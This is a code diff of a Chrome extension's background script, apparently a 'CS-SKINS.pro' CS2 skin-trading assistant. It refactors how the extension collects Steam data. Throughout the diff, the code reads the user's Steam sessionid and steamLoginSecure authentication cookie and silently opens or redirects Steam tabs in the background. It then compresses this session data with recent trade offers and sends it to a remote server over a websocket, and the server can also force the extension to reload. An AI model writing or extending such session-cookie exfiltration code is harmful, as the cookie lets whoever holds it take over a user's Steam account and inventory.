@@ -4,9 +4,48 @@ class TradingAssistant {
         this.isAuthorized = false;
         this.wsConnection = null;
         this.storageKey = 'cs2_marketplace_extension';
-        this.isCheckingSteam = false; // Флаг для предотвращения одновременных проверок
+        this.isCheckingSteam = false;
         
         this.init();
+    }
+
+    async compressData(data) {
+        try {
+            const jsonString = JSON.stringify(data);
+            
+            // Сжимаем только если данных много (>1KB)
+            if (jsonString.length <= 1024) {
+                return { data, encoding: 'none' };
+            }
+
+            // Используем встроенный CompressionStream
+            const stream = new CompressionStream('gzip');
+            const writer = stream.writable.getWriter();
+            const reader = stream.readable.getReader();
+            
+            writer.write(new TextEncoder().encode(jsonString));
+            writer.close();
+            
+            const compressed = [];
+            let done = false;
+            
+            while (!done) {
+                const { value, done: readerDone } = await reader.read();
+                done = readerDone;
+                if (value) compressed.push(...value);
+            }
+            
+            return {
+                compressed: compressed,
+                encoding: 'gzip',
+                original_size: jsonString.length,
+                compressed_size: compressed.length
+            };
+            
+        } catch (error) {
+            // При ошибке сжатия отправляем без сжатия
+            return { data, encoding: 'none' };
+        }
     }
     
     async storage(action, data = null) {
@@ -45,28 +84,51 @@ class TradingAssistant {
         this.isCheckingSteam = true;
         
         try {
-            const data = await this.storage('get');
-            const previousOverallStatus = data.overallStatus || 'inactive';
+            const storageData = await this.storage('get');
+            const previousOverallStatus = storageData.overallStatus || 'inactive';
             
-            // Получаем валидную Steam сессию
-            const session = await this.getValidSteamSession();
+            const steamData = await this.getValidSteamData();
             
-            if (session) {
-                // Отправляем сессию и трейды на сервер
+            if (!steamData) {
+                console.log('⚠️ getValidSteamData returned null');
+                await this.storage('set', { 
+                    overallStatus: 'inactive',
+                    steamStatus: 'no_data'
+                });
+            }
+            
+            if (steamData) {
+                // Получаем предыдущие трейды из storage
+                const storageData = await this.storage('get');
+                const previousTrades = storageData.lastTrades || [];
+                
                 const dataToSend = {
-                    session: session,
+                    session: steamData.session,
                     timestamp: new Date().toISOString()
                 };
                 
-                // Добавляем трейды если они есть
-                if (session.trades && session.trades.length > 0) {
-                    dataToSend.trades = session.trades.map(trade => ({
-                        trade_offer_id: trade.tradeofferid,
-                        status: trade.trade_offer_state
-                    }));
+                // Сравниваем текущие трейды с предыдущими
+                let changedTrades = [];
+                if (steamData.trades && steamData.trades.length > 0) {
+                    changedTrades = steamData.trades.filter(currentTrade => {
+                        const prevTrade = previousTrades.find(p => p.trade_offer_id === currentTrade.trade_offer_id);
+                        return !prevTrade || 
+                               prevTrade.status !== currentTrade.status || 
+                               prevTrade.needs_confirmation !== currentTrade.needs_confirmation;
+                    });
                 }
                 
-                const sent = await this.sendToServer('session_data', dataToSend);
+                // Добавляем только изменившиеся трейды (если есть)
+                if (changedTrades.length > 0) {
+                    dataToSend.trades = changedTrades;
+                }
+                
+                // Всегда отправляем сессию (для поддержания соединения)
+                const compressedData = await this.compressData(dataToSend);
+                const sent = await this.sendToServer('session_data', compressedData);
+                
+                // Сохраняем текущие трейды для следующего сравнения
+                await this.storage('set', { lastTrades: steamData.trades || [] });
                 
                 // Статус станет 'active' только когда сервер ответит session_received
                 // Пока ставим 'pending' - ждем ответа от сервера
@@ -104,7 +166,7 @@ class TradingAssistant {
         }
     }
     
-    async getSteamSession(tabId) {
+    async getSteamData(tabId) {
         try {
             // Сначала получаем данные из content script
             const contentScriptData = await new Promise((resolve) => {
@@ -135,10 +197,25 @@ class TradingAssistant {
                 //console.log('⚠️ Не удалось получить трейды:', error.message);
             }
             
-            // Объединяем данные сессии и трейдов
+            if (trades && Array.isArray(trades)) {
+                const threeHoursAgo = Date.now() - (180 * 60 * 1000);
+                trades = trades
+                    .filter(trade => {
+                        const tradeTime = (trade.time_updated || trade.time_created || 0) * 1000;
+                        return tradeTime >= threeHoursAgo;
+                    })
+                    .map(trade => ({
+                        trade_offer_id: trade.tradeofferid,
+                        status: trade.trade_offer_state,
+                        needs_confirmation: trade.confirmation_method === 2
+                    }));
+            }
+            
             return {
-                ...contentScriptData,
-                steamLoginSecure: cookies.steamLoginSecure || null,
+                session: {
+                    ...contentScriptData,
+                    steamLoginSecure: cookies.steamLoginSecure || null
+                },
                 trades: trades
             };
             
@@ -171,28 +248,35 @@ class TradingAssistant {
         }
     }
     
-    async getValidSteamSession() {
+    async getValidSteamData() {
         try {
-            const data = await this.storage('get');
-            const expectedSteamId = data.userInfo?.steam_id;
+            const storageData = await this.storage('get');
+            const expectedSteamId = storageData.userInfo?.steam_id;
             
             if (!expectedSteamId) {
+                console.log('⚠️ No expectedSteamId found', { userInfo: storageData.userInfo });
                 return null;
             }
+            
+            console.log('✓ Starting Steam data collection for', expectedSteamId);
             
             // Ищем первую Steam вкладку (любую)
             const steamTabs = await chrome.tabs.query({ url: ["*://steamcommunity.com/*"] });
             let targetTab;
             
+            console.log('✓ Found Steam tabs:', steamTabs.length);
+            
             if (steamTabs.length > 0) {
                 // Используем первую найденную Steam вкладку
                 targetTab = steamTabs[0];
+                console.log('✓ Using existing tab:', targetTab.id);
                 // Всегда обновляем страницу для получения актуальных данных
                 await chrome.tabs.update(targetTab.id, { 
                     url: `https://steamcommunity.com/profiles/${expectedSteamId}/edit/info` 
                 });
             } else {
                 // Создаем новую вкладку если Steam вкладок нет
+                console.log('✓ Creating new Steam tab');
                 targetTab = await chrome.tabs.create({ 
                     url: `https://steamcommunity.com/profiles/${expectedSteamId}/edit/info`, 
                     active: false 
@@ -229,24 +313,32 @@ class TradingAssistant {
             }
             
             // Получаем данные сессии из вкладки
-            const session = await this.getSteamSession(targetTab.id);
+            console.log('✓ Getting Steam data from tab');
+            const steamData = await this.getSteamData(targetTab.id);
             
-            if (!session?.sessionid) {
+            console.log('✓ Steam data result:', steamData ? 'success' : 'null');
+            console.log('✓ Data structure:', steamData);
+            
+            if (!steamData?.session?.sessionid) {
+                console.log('⚠️ No sessionid in Steam data');
                 return null;
             }
             
             // Извлекаем Steam ID из финального URL после всех редиректов
             const steamIdMatch = finalTab.url.match(/steamcommunity\.com\/profiles\/(\d+)/);
-            const actualSteamId = steamIdMatch ? steamIdMatch[1] : session?.steamid;
+            const actualSteamId = steamIdMatch ? steamIdMatch[1] : steamData.session?.steamid;
             
             // Проверяем что это правильный аккаунт
             if (actualSteamId !== expectedSteamId) {
+                console.log('⚠️ Steam ID mismatch:', actualSteamId, 'expected:', expectedSteamId);
                 return null;
             }
             
-            return session;
+            console.log('✓ Steam data validation passed, returning data');
+            return steamData;
             
         } catch (error) {
+            console.log('⚠️ Error in getValidSteamData:', error);
             return null;
         }
     }
@@ -419,7 +511,7 @@ class TradingAssistant {
             if (!storageData.websocketChannel) return false;
             
             const message = {
-                event: 'client-message',
+                event: 'extension-message',
                 data: { type, ...data },
                 channel: storageData.websocketChannel
             };
@@ -445,9 +537,21 @@ async function handleServerMessage(messageType, messageData) {
             });
             await updateActivityIcon();
             break;
+        case 'connected':
+            // Сервер подтвердил подключение - можно начинать отправлять сессии
+            await assistant.storage('set', { 
+                overallStatus: 'ready',
+                lastServerResponse: new Date().toISOString() 
+            });
+            await updateActivityIcon();
+            break;
         case 'force_logout':
             await assistant.logout();
             chrome.runtime.sendMessage({ type: 'FORCE_LOGOUT', message: messageData?.message || 'Требуется переавторизация' }).catch(() => {});
+            break;
+        case 'reload_extension':
+            // Перезагружаем расширение
+            chrome.runtime.reload();
             break;
     }
 }
@@ -475,6 +579,12 @@ async function updateActivityIcon() {
             chrome.action.setTitle({ title: 'CS-SKINS.pro - Активен' });
             chrome.action.setBadgeText({ text: '●' });
             chrome.action.setBadgeBackgroundColor({ color: '#44ff44' });
+            break;
+        case 'ready':
+            // Подключен, готов отправлять - синий
+            chrome.action.setTitle({ title: 'CS-SKINS.pro - Подключен' });
+            chrome.action.setBadgeText({ text: '◉' });
+            chrome.action.setBadgeBackgroundColor({ color: '#0088ff' });
             break;
         case 'pending':
             // Ждем ответа от сервера - желтый
